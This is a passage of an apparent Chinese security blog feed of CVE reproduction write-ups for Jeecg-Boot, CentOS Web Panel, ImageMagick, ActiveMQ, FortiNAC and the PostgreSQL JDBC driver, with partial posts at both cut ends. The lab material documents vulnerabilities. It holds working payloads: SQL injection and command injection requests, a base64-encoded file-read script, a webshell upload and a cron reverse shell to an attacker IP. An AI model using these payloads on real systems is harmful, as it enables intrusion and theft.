class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">ClinicalDocument</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:hl7-org:v3&quot;</span> /&gt;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103507414.png"></p><p>在攻击机上开启http服务</p><p>python -m SimpleHTTPServer</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103545192.png"></p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>在NiFi控制页面上，分别启动GetFile和ExtractCCDAAttributes处理器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103713745.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103733699.png"></p><p>当GetFile和ExtractCCDAAttributes处理器的Read&#x2F;Write字段出现相同的值时，表示处理完成</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103815836.png"></p><p>此时，查看攻击机的Http服务</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230410103925160.png"></p><p>发现成功利用XXE</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Jeecg-Boot SQL注入漏洞-CVE-2023-1454</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/jeecg-boot-cve-2023-1454/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/jeecg-boot-cve-2023-1454/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>测试环境</strong></p><p>Java：jdk1.8.0_65</p><p>Jeecg-Boot：3.5.0</p><h2 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h2><p>jdk8u65</p><h2 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h2><p>见MySQL安装文档</p><p>导入数据库文件</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> -u root -p &lt; jeecgboot-mysql-<span class="hljs-number">5</span>.<span class="hljs-number">7</span>.sql</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240306102056672.png"></p><h2 id="安装Jeecg-Boot"><a href="#安装Jeecg-Boot" class="headerlink" title="安装Jeecg-Boot"></a>安装Jeecg-Boot</h2><p><strong>打包方式参考：<a href="http://doc.jeecg.com/2043886#JAR_0">http://doc.jeecg.com/2043886#JAR_0</a></strong></p><p>下载源码：<a href="https://github.com/jeecgboot/jeecg-boot/archive/refs/tags/v3.5.0.zip">https://github.com/jeecgboot/jeecg-boot/archive/refs/tags/v3.5.0.zip</a></p><p>使用IDEA打开，自定义数据库链接配置<code>src/main/resources/application-prod.yml</code></p><p> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240306103210819.png"> </p><p>点击右侧的maven图标，进入<code>JEECG BOOT 3.5.0</code>–<code>Lifecycle</code>，双击<code>package</code>打包</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240306103304343.png"> </p><p>成功打包后在<code>jeecg-boot-3.5.0\jeecg-module-system\jeecg-system-start\target</code>路径下生成<code>jeecg-system-start-3.5.0.jar</code>文件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240306103635968.png"> </p><p>启动</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar jeecg-system-start-<span class="hljs-number">3</span>.<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.jar</code></pre></div><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><a href="http://10.58.120.200:8080/jeecg-boot">http://10.58.120.200:8080/jeecg-boot</a>    jeecg &#x2F; jeecg1314</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240306103814720.png"> </p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240306103952314.png"> </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>在 jeecg-boot 3.5.0 中发现了一个严重漏洞。这会影响文件 jmreport&#x2F;qurestSql 的未知部分。参数apiSelectId 的操作导致 sql 注入。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>Jeecg-Boot  v3.5.0</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>POC</p><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/jeecg-boot/jmreport/qurestSql</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.58.120.200:8080<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>130<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<span class="language-scilab">&#123;<span class="hljs-string">&quot;apiSelectId&quot;</span>:<span class="hljs-string">&quot;1290104038414721025&quot;</span>,</span><span class="language-scilab"><span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;1&#x27;</span> <span class="hljs-built_in">or</span> <span class="hljs-string">&#x27;%1%&#x27;</span> like (updatexml(<span class="hljs-number">0x3a</span>,concat(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> current_user)),<span class="hljs-number">1</span>)) <span class="hljs-built_in">or</span> <span class="hljs-string">&#x27;%%&#x27;</span> like <span class="hljs-string">&#x27;&quot;</span>&#125;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240306104318343.png"> </p><p>成功获取jeecg-boot服务器上数据库的当前用户名 </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Centos Web Panel 7远程命令执行漏洞-CVE-2022-44877</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/centos-web-panel-7-cve-2022-44877/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/centos-web-panel-7-cve-2022-44877/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>CentOS WebPanel：0.9.8.1146</p><h2 id="安装CentOS-WebPanel"><a href="#安装CentOS-WebPanel" class="headerlink" title="安装CentOS WebPanel"></a>安装CentOS WebPanel</h2><p>安装文档：<a href="https://control-webpanel.com/installation-instructions#step1">https://control-webpanel.com/installation-instructions#step1</a></p><p>yum -y install wget update</p><p>reboot</p><p>cd &#x2F;usr&#x2F;local&#x2F;src</p><p>sh cwp-el7-latest</p><p>reboot</p><h2 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h2><p><a href="http://ip:2030/">http://ip:2030/</a><br>root&#x2F;root的密码</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/centos-1.png"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>CentOS Web Panel（CWP,Control Web Panel），是一个开源的Linux控制面板软件，用于部署虚拟主机环境，国内外有一定的使用量。CWP7的 &#x2F;login&#x2F;index.php中存在远程代码执行漏洞，未经授权的远程攻击者可以构造恶意请求触发远程命令执行，从而控制服务器。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>Control Web Panel el &lt;&#x3D; 0.9.8.1147</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><div class="code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login/index.php?login=$(whoami)</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.26.151:2031<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>cwpsrv-4d07b0de8d93a7b17105e1254db634b0=6aqjns9861q8lvj8lr4fj5n8ko; _firstImpression=true<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>40<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="language-pgsql">username=root&amp;<span class="hljs-keyword">password</span>=toor&amp;<span class="hljs-keyword">commit</span>=<span class="hljs-keyword">Login</span></span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/centos-2.png"></p><p>查看执行结果</p><div class="code-wrapper"><pre><code class="hljs arcade">tail <span class="hljs-number">-10</span>f /<span class="hljs-keyword">var</span>/<span class="hljs-built_in">log</span>/cwp_client_login.<span class="hljs-built_in">log</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/centos-3.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ImageMagick 任意文件读取漏洞-CVE-2022-44268</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ImageMagick-cve-2022-44268/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ImageMagick-cve-2022-44268/</url>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a><strong>1. 漏洞描述</strong></h1><p>ImageMagick 中存在任意文件读取漏洞，攻击者可通过精心制作的 PNG 文件，当网站或应用使用 ImageMagick 对攻击者上传的恶意 PNG 文件进行解析时将触发此漏洞。最终可导致敏感信息泄露。</p><h1 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a><strong>2. 影响版本</strong></h1><p>ImageMagick 7.1.x &lt;&#x3D; 7.1.0-51</p><p>ImageMagick 7.0.x</p><p>ImageMagick 6.9.x</p><p>6.8.3-10 &lt;&#x3D; ImageMagick 6.8.x &lt;&#x3D; 6.8.9-10</p><h1 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a><strong>3. 危害等级</strong></h1><p>高危</p><h1 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a><strong>4. 复现过程</strong></h1><p>下载图片</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://cdn2.pic.y1ng.vip/uPic/<span class="hljs-number">2023</span>/<span class="hljs-number">02</span>/<span class="hljs-number">03</span>/m1-<span class="hljs-number">145410</span>_1.png -O <span class="hljs-number">1</span>.png</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;IyEvYmluL2Jhc2gKCmlmIFsgLXogIiQxIiBdOyB0aGVuCiAgICBmaWxlPSIvZXRjL3Bhc3N3ZCIKZWxzZQogICAgZmlsZT0iJDEiCmZpCgpwbmdjcnVzaCAtdGV4dCBhICJwcm9maWxlIiAiJGZpbGUiIDEucG5nIApleGl2MiAtcFMgcG5nb3V0LnBuZyAKY29udmVydCBwbmdvdXQucG5nIGdvcHJvLnBuZyAKCmlkZW50aWZ5IC12ZXJib3NlIGdvcHJvLnBuZyB8IGdyZXAgLWUgIl5bMC05YS1mXSokIiB8ICBncmVwIC4gfCB4eGQgLXIgLXAK&#x27;</span> | <span class="hljs-built_in">base64</span> -d &gt; run.sh</code></pre></div><p>chmod +x run.sh</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230223114248312.png"></p><p>.&#x2F;run.sh</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230223114321423.png"></p><p>.&#x2F;run.sh [file]</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230223114343421.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ImageMagick 拒绝服务漏洞-CVE-2022-44267</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ImageMagick-cve-2022-44267/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ImageMagick-cve-2022-44267/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>测试环境</strong></p><p>Ubuntu20.04、imagemagick</p><h2 id="安装ImageMagick"><a href="#安装ImageMagick" class="headerlink" title="安装ImageMagick"></a>安装ImageMagick</h2><div class="code-wrapper"><pre><code class="hljs sql">apt <span class="hljs-keyword">update</span> <span class="hljs-comment">--allow-insecure-repositories</span>apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install pngcrush imagemagick exiftool xxd exiv2 <span class="hljs-operator">-</span>y <span class="hljs-comment">--allow-unauthenticated</span></code></pre></div><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>ImageMagick 中存在拒绝服务漏洞，攻击者可通过精心制作的 PNG 文件，当网站或应用使用 ImageMagick 对攻击者上传的 PNG 文件进行解析时将触发此漏洞。最终可导致拒绝服务。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>ImageMagick 7.1.x &lt;&#x3D; 7.1.0-51</p><p>ImageMagick 7.0.x</p><p>ImageMagick 6.9.x</p><p>6.8.3-10 &lt;&#x3D; ImageMagick 6.8.x &lt;&#x3D; 6.8.9-10</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://cdn2.pic.y1ng.vip/uPic/<span class="hljs-number">2023</span>/<span class="hljs-number">02</span>/<span class="hljs-number">03</span>/m1-<span class="hljs-number">145410</span>_1.png -O <span class="hljs-number">2</span>.png<span class="hljs-attribute">pngcrush</span> -text a <span class="hljs-string">&quot;profile&quot;</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-number">2</span>.png</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230223113706111.png"> </p><div class="code-wrapper"><pre><code class="hljs ada">strace convert pngout.png -resize <span class="hljs-number">128</span>x128 <span class="hljs-keyword">out</span>.png</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230223113740826.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Apache ActiveMQ Jolokia 代码执行漏洞-CVE-2022-41678</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/activemq-cve-2022-41678/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/activemq-cve-2022-41678/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="安装JAVA"><a href="#安装JAVA" class="headerlink" title="安装JAVA"></a>安装JAVA</h2><p>JDK11</p><h2 id="安装ActiveMQ"><a href="#安装ActiveMQ" class="headerlink" title="安装ActiveMQ"></a>安装ActiveMQ</h2><p>下载</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://archive.apache.org/dist/activemq/<span class="hljs-number">5</span>.<span class="hljs-number">16</span>.<span class="hljs-number">4</span>/apache-activemq-<span class="hljs-number">5</span>.<span class="hljs-number">16</span>.<span class="hljs-number">4</span>-bin.zip</code></pre></div><p> 修改配置</p><div class="code-wrapper"><pre><code class="hljs lasso">conf\jetty.<span class="hljs-built_in">xml</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240228154848422.png"> </p><p>搜索关键字<code>jettyPort</code>，将127.0.0.1修改为主机网卡IP</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240228154939065.png"> </p><p>启动</p><div class="code-wrapper"><pre><code class="hljs crmsh">bin\activemq.bat <span class="hljs-literal">start</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240228155051515.png"> </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>Apache AсtivеＭQ Jоlоkiа 中存在远程代码执行漏洞，在AсtivеMQ中，经过身份验证的远程攻击者下可通过&#x2F;арi&#x2F;јоlоkiа&#x2F;接口操作MBеаn,成功利用此漏洞可导致远程代码执行。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>Apache ActiveMQ &lt; 5.16.6</p><p>5.17.0&lt; Apache ActiveMQ &lt; 5.17.4</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>Idea切换jdk11，运行VulDebug项目的<code>Apache/src/main/java/activemq/cve/CVE_2022_41678.java</code>脚本</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240228161827221.png"> </p><p>服务器上成功创建了webshell.jsp文件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240228161906562.png"> </p><p>访问webshell</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.58</span>.<span class="hljs-number">120.200</span>:<span class="hljs-number">8161</span><span class="hljs-regexp">/admin/</span>webshell.jsp</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240228162550307.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fortinet FortiNAC 远程代码执行漏洞-CVE-2022-39952</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/FortiNAC-cve-2022-39952/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/FortiNAC-cve-2022-39952/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载镜像</p><div class="code-wrapper"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>support.fortinet.com<span class="hljs-regexp">/Download/</span>FirmwareImages.aspx</code></pre></div><p>安装</p><p>使用PC机安装需要开启PC机的CPU虚拟化</p><div class="code-wrapper"><pre><code class="hljs dns">解压FNAC_ESX_9.<span class="hljs-number">2</span>.<span class="hljs-number">5</span>_build0443.ova.zip文件后删除fortinac-<span class="hljs-number">9</span>.<span class="hljs-number">2.5.0443</span>.mf文件，使用Vmware WorkStation导入OVF文件新建虚拟机，将网络适配器改为NAT</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305093407469.png"> </p><p>CentOS7单用户修改root用户密码</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305104152681.png"> </p><p>选择第一个内核，按<code>e</code>键进入修改配置界面，下拉找到linux16这一行</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305104302526.png"> </p><p>将<code>ro</code>改为<code>rw</code>，再将<code>console=ttyS0*</code>改为<code>console=tty0</code>，后面再添加<code>edd=off</code>和<code>init=/bin/bash</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305104452941.png"> </p><p>按<code>ctrl+x</code>启动，成功进入到bash界面</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305104655701.png"> </p><p>接着即可修改root用户密码</p><div class="code-wrapper"><pre><code class="hljs bash">passwd root<span class="hljs-built_in">exec</span> /sbin/init</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305104755298.png"> </p><p>使用修改后的root密码成功登入</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305104839450.png"> </p><p>访问</p><p><a href="https://192.168.26.131:8443/gui/">https://192.168.26.131:8443/gui/</a>   root&#x2F;YAMS</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305093919803.png"> </p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. 漏洞描述</h2><p>FоrtiNAC kеуUрlоаd 脚本中存在任意文件写入漏洞，未经身份认证的远程攻击者可利用此漏洞向目标系统写入任意内容，最终可在目标系统上以 Rооt 权限执行任意命令。</p><h2 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h2><p>FortiNAC &#x3D;&#x3D; 9.4.0</p><p>9.2.0 &lt;&#x3D; FortiNAC &lt;&#x3D; 9.2.5</p><p>9.1.0 &lt;&#x3D; FortiNAC &lt;&#x3D; 9.1.7</p><p>FortiNAC 8.8.x</p><p>FortiNAC 8.7.x</p><p>FortiNAC 8.6.x</p><p>FortiNAC 8.5.x</p><p>FortiNAC 8.3.x</p><h2 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. 危害等级</h2><p>高危</p><h2 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. 复现过程</h2><p>在攻击机上开启反弹Shell端口监听</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">8888</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305094435552.png"> </p><p>payload文件内容</p><div class="code-wrapper"><pre><code class="hljs awk">* * * * * root bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/192.168.26.159/</span><span class="hljs-number">8888</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre></div><p>运行Exp</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> CVE-<span class="hljs-number">2022</span>-<span class="hljs-number">39952</span>.py -t <span class="hljs-number">192.168.26.131</span> -f payload</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305094556372.png"> </p><p>攻击机成功接收到shell</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240305103752090.png"> </p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pPostgreSQL JDBC Driver 命令执行漏洞-CVE-2022-31197</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/postgresql-jdbc-cve-2022-31197/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/postgresql-jdbc-cve-2022-31197/</url>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞描述"><a href="#1-漏洞描述" class="headerlink" title="1. 漏洞描述"></a>1. <strong>漏洞描述</strong></h1><p>在 PostgreSQL JDBC 中 јаvа.ѕԛl.RеѕultRоԝ.rеfrеѕhRоԝ()方法未对列名进行转义，包含语句终止符（例如;）的恶意列名可能导致 SQL 注入。这可能导致以应用程序的 JDBC 用户身份执行恶意的 SQL 命令最终达到远程代码执行。</p><h1 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. <strong>影响版本</strong></h1><p>PostgreSQL JDBC Driver &lt; 42.2.26</p><p>42.3.0 &lt;&#x3D; PostgreSQL JDBC Driver &lt; 42.3.7</p><p>42.4.0 &lt;&#x3D; PostgreSQL JDBC Driver &lt; 42.4.1</p><h1 id="3-危害等级"><a href="#3-危害等级" class="headerlink" title="3. 危害等级"></a>3. <strong>危害等级</strong></h1><p>高危</p><h1 id="4-复现过程"><a href="#4-复现过程" class="headerlink" title="4. 复现过程"></a>4. <strong>复现过程</strong></h1><p>使用Navicat工具连接PostgreSQL数据库</p><div class="code-wrapper"><pre><code class="hljs dns">主机：<span class="hljs-number">10.58.120.200</span>端口：<span class="hljs-number">5432</span>数据库名：testdb用户名：postgres密码：postgres</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304144711343.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20240304144749285.png"> </p><p>创建一个IDEA maven项目，在pom.xml中添加</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>postgresql<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>42.2.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>运行<code>CVE_2022_31197.java</code></p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> java.<span class="hljs-keyword">sql</span>.*;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> CVE_2022_31197 &#123;    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args) throws ClassNotFoundException, SQLException &#123;        <span class="hljs-keyword">Class</span>.forName(&quot;org.postgresql.Driver&quot;);        <span class="hljs-keyword">Connection</span> <span class="hljs-keyword">connection</span> = 